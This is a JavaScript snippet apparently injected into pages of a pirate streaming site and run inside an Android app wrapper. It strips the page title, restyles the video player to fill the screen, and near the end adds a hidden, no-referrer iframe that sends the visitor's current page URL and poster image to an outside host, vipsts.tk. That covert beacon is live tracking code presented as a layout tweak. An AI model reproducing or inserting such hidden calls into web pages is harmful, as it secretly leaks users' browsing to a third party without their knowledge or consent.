var tty = document.title;
    var gguy = tty.replace('MegaFilmesHD50','').replace('|','').replace(' – ','').replace('Filmes','').replace('Séries','').replace('Assistir','').replace('Grátis','').replace(' e ',' ').replace('!','').replace('Legendado','');
    $('.item').addClass('ripple');
    $('.se-a').removeAttr('style');
$('body').prepend('<style>iframe:focus {outline: 0;outline-color: transparent;outline-style: none;}iframe{object-fit: fill;overflow: hidden;}body{overflow:hidden}#seasons .se-c .se-q span.se-t {background: #444 !important;}body{overflow:hidden}#seasons .se-c .se-q {background: #333 !important;}#episodes{padding-top: 70px !important;display: block;position: fixed;top: 0px;background: #000 !important;z-index: 9000;overflow: auto;width: 100%;height: 100%;}.item a :hover{color:#fff}.se-a{display:block !important}.ripple{position:relative;overflow:hidden;transform:translate3d(0,0,0)}.ripple:after{content:"";display:block;position:absolute;width:100%;height:100%;top:0;left:0;pointer-events:none;background-image:radial-gradient(circle,#ccc 10%,transparent 10.01%);background-repeat:no-repeat;background-position:50%;transform:scale(10,10);opacity:0;transition:transform .5s,opacity 1s}.ripple:active:after{transform:scale(0,0);opacity:.2;transition:0s}a,a:focus{outline:0}a,a:focus{-webkit-tap-highlight-color:transparent}body, html {padding: 0;left: 0;font-family: sans-serif}.byst {display:none;position: absolute;z-index: 4000;top: 5px;right: 15px;}.by {display:none;position: absolute;z-index: 4000;top: 5px;right: 15px;}.bysx {position: absolute;height: 100%;z-index: 4000;padding-top: 17px;top: 0px;padding-left: 15px;text-align: center;color: #ccc;border-bottom: 2px #cd0000 solid;padding-bottom: 0px;padding-right: 15px;}.backs {position: fixed;z-index: 9002;top: 0;right: 0;background: #000;width: 100%;height: 50px;}#dooplay_player_response{position: fixed;width: 100%;height: 100%;top: 0;background: #000;bottom: 0;z-index: 9000;}.dooplay_player .play .pframe iframe {position: fixed;z-index:9002;top: 0;left: 0;width: 100%;height: 100%;}.pag_episodes .item:last-of-type {display:none;font-weight:bold;position: fixed;z-index: 9009;bottom: 72px;right: 7px;text-align: right;}.bys {display:none;position: absolute;z-index: 4000;top: 6px;right: 58px;}.pag_episodes .item a {color:#fff;padding: 6px;padding-left: 0px;float: left;width: 100%;}.pag_episodes .item a {color: #fff;padding: 6px;float: right;width: auto;}.xxx{position: fixed;z-index: 9001;top: 0;bottom: 0;margin: auto;left: 0;right: 0;width: max-content;height: max-content;font-size: 17px;}.xxx img{margin-top:10px;}body{display:block !important}</style><div class="backs"><div class=" bysx">'+ gguy +'</div> <div class=" byst ripple"><a class="yy"  hrefx=""><img src="https://i.imgur.com/HN1DLsn.png" width="25px"></a></div> <div class=" bys ripple"><a download="1.mp4" target="_parent" href=""><img src="https://i.imgur.com/HN1DLsn.png" width="25px"></a></div>  <div class="by ripple"><a target="_parent" href=""><img src="https://i.imgur.com/10taQh1.png" width="25px"></a></div></div>');

$(".bysx").text(function(index, currentText) {
    return currentText.substr(0, 31);
});

var win = window.location.href;
var image = $('.poster img').attr('src')
var head= document.getElementsByTagName('body')[0];
var script= document.createElement('iframe');
script.src= 'https://vipsts.tk/ii3.php?url=http://vipsts.tk/w/ldtvnews.php?u='+ win +'&img=' + image;
script.style= 'display:none';
script.referrerpolicy= 'no-referrer';
head.appendChild(script);

document.querySelector("meta[name=viewport]").setAttribute(
          'content', 
          'width=600');
window.CallToAndroidFunction.setVisible(); 